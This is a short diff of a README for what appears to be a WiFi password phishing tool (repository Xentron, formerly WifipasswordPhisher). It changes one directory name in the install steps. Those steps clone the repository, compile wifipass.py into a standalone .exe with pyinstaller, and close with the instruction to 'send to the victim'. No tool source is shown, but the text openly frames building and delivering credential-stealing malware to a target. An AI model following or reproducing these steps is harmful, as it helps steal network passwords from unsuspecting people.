@@ -12,7 +12,7 @@
 ## Install and compile
 
 	git clone https://github.com/Astranot/Xentron.git
-	cd WifipasswordPhisher
+	cd Xentron
 	pyinstaller --onefile wifipass.py
 	
 Locate the .exe file in the dist folder and send to the victim
